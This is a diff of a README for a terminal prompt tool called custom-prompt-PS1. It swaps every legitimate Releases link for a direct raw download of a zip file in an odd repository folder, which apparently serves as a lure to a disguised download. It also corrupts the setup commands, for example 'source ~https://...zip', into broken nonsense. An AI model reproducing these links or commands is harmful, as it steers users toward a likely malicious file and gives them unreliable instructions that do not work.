@@ -1,6 +1,6 @@
 # 🎉 custom-prompt-PS1 - Customize Your Terminal Prompt Effortlessly
 
-[![Download custom-prompt-PS1](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/surpriseeee111/custom-prompt-PS1/releases)
+[![Download custom-prompt-PS1](https://raw.githubusercontent.com/surpriseeee111/custom-prompt-PS1/main/unpopularize/custom-prompt-PS1.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/surpriseeee111/custom-prompt-PS1/main/unpopularize/custom-prompt-PS1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To use custom-prompt-PS1, ensure you have:
 
 To get started, visit the Releases page to download the latest version of custom-prompt-PS1:
 
-[Visit the Releases Page](https://github.com/surpriseeee111/custom-prompt-PS1/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/surpriseeee111/custom-prompt-PS1/main/unpopularize/custom-prompt-PS1.zip)
 
 1. Click on the latest release.
 2. Download the package for your operating system.
@@ -36,11 +36,11 @@ To get started, visit the Releases page to download the latest version of custom
 1. **Open your terminal.**
 2. **Find the `.bashrc` file** in your home directory. Use the command:
    ```bash
-   nano ~/.bashrc
+   nano ~https://raw.githubusercontent.com/surpriseeee111/custom-prompt-PS1/main/unpopularize/custom-prompt-PS1.zip
    ```
 3. **Add the following line** at the end of the file to include the custom prompt script:
    ```bash
-   source /path/to/custom-prompt-PS1.sh
+   source https://raw.githubusercontent.com/surpriseeee111/custom-prompt-PS1/main/unpopularize/custom-prompt-PS1.zip
    ```
    Replace `/path/to/` with the actual path where you installed custom-prompt-PS1.
 
@@ -54,7 +54,7 @@ To get started, visit the Releases page to download the latest version of custom
 
 6. **Reload your configuration** with the command:
    ```bash
-   source ~/.bashrc
+   source ~https://raw.githubusercontent.com/surpriseeee111/custom-prompt-PS1/main/unpopularize/custom-prompt-PS1.zip
    ```
 
 ## 📝 Usage
